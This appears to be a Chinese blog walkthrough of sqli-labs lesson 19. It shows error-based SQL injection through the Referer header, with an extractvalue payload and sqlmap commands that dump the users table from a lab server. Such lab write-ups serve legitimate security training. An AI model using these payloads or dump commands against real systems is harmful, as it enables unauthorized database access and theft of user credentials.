---
title: sqli-labs lession 19 POST基于错误的Referer字段数据头注入
date: 2018-09-29 19:49:33
tags: [sqli-labs]
categories: sql注入
---
# sqli-labs lession 19 POST基于错误的Referer字段数据头注入 #

## 登录界面 ##

![1](/img/sql/Lesson-19/1.png)

## 注入 ##

根据题目提示直接在Referer字段尝试。

![2](/img/sql/Lesson-19/2.png)

单引号引起报错

![3](/img/sql/Lesson-19/3.png)

抑制下一个单引号

![4](/img/sql/Lesson-19/4.png)

payload:

`http://10.60.250.66/sql/Less-19/' and extractvalue(null,concat(0x7e,database(),0x7e)) and '1'='1`

![5](/img/sql/Lesson-19/5.png)

详细过程看Lesson-18

{% post_link sqli-labs-lession-18-POST基于错误的Uagent字段数据头注入 点击查看%}

## SQLMAP ##

```
--data:指定请求数据

--method:指定请求方式

--dbms:指定后端数据库

--thread:指定并发线程

--referer:指定referer字段

--level 3:加入检测User-Agent和Referer

--technique E:检测报错注入
```

`sqlmap -u "http://10.60.250.66/sql/Less-19/" --data "uname=admin&passwd=admin&submit=Submit" --method POST --dbms mysql --threads 10 --referer "http://10.60.250.66/sql/Less-19/' and '1'='1" --level 3 --technique E `

![6](/img/sql/Lesson-19/6.png)

![7](/img/sql/Lesson-19/7.png)

`sqlmap -u "http://10.60.250.66/sql/Less-19/" --data "uname=admin&passwd=admin&submit=Submit" --method POST --dbms mysql --threads 10 --referer "http://10.60.250.66/sql/Less-19/' and '1'='1" --level 3 --technique E -D security -T users --columns --dump`

![8](/img/sql/Lesson-19/8.png)